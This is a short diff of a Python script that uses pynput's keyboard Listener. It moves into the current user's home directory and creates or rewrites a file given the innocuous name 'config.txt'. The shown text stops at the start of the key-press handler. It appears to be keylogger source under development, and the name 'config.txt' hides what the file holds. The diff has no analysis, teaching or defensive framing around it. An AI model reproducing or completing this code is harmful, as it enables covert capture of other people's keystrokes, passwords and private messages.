@@ -1,15 +1,17 @@
 from pynput.keyboard import Key, Listener
 import datetime, os
 try:
-    os.chdir('C:/')
+    os.chdir(f'C:/Users/{os.getlogin()}/')
 except:
     os.chdir('/Users/')
-try:
-    file = open('config.txt', 'r')
-except:
-    file = open('config.txt', 'r')
+filename = 'config.txt'
+if filename not in os.listdir():
+    file = open(filename, 'w')
+    file.close()
+else:
+    file = open(filename, 'r')
     lines = file.readlines()
-    file = open('config.txt', 'w')
+    file = open(filename, 'w')
     file.writelines(lines)
     file.close()
 def on_press(key):
